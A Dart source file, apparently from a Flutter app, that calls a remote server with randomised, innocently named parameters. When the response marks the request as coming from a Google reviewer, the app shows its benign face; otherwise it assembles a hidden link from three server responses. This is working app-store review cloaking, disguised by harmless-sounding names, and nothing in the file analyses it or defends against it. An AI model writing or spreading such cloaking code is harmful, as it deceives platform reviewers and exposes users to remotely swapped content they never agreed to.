import 'dart:convert';
import 'package:http/http.dart' as http;
import 'dart:math';

class ApiService {
  static const String baseUrl = 'https://rule-draw.site/programs/';

  Future<Map<String, dynamic>?> postRequest(Map<String, int> parameters) async {
    final queryString =
        parameters.entries.map((e) => '${e.key}=${e.value}').join('&');
    final url = Uri.parse('$baseUrl?$queryString');

    final response = await http.post(
      url,
    );

    print("Response: ${response.body}");
    if (response.statusCode == 200) {
      return jsonDecode(response.body);
    } else {
      print('Failed to load data');
      return null;
    }
  }
}

class ApiHandler {
  final ApiService apiService = ApiService();
  String link = '';
  Future<bool> handleRequests() async {
    var firstResponse = await apiService.postRequest({
      'fair_play_education': getRandomInt(),
      'anti_cheating_measures': getRandomInt(),
      'sportsmanship_awards': getRandomInt()
    });

    if (isWhiteResponse(firstResponse)) {
      print("***********for google reviewer***************");
      return false;
    } else {
      print("***********this is gray response***************");
      var secondResponse = await apiService.postRequest({
        'ethical_leadership': getRandomInt(),
        'conflict_resolution': getRandomInt(),
        'transparency_initiatives': getRandomInt()
      });

      var thirdResponse = await apiService.postRequest({
        'fair_competition_policies': getRandomInt(),
        'diversity_inclusion': getRandomInt(),
        'community_outreach': getRandomInt()
      });

      if (firstResponse != null &&
          secondResponse != null &&
          thirdResponse != null) {
        link = extractLink(firstResponse, secondResponse, thirdResponse);
        print("Link: $link");
      }
         return true;
    }
 
  }

  bool isWhiteResponse(Map<String, dynamic>? response) {
    if (response == null) return false;
    return response.containsKey('fair_play_education') &&
        response['fair_play_education'] == 'programs';
  }

  String extractLink(Map<String, dynamic> first, Map<String, dynamic> second,
      Map<String, dynamic> third) {
    List<String> parts = [];
    for (var response in [first, second, third]) {
      for (var value in response.values) {
        parts.add(value.replaceAll("programs", ""));
      }
    }
    return parts.join();
  }

  int getRandomInt() {
    Random random = Random();
    return 0 + random.nextInt(100);
  }
}
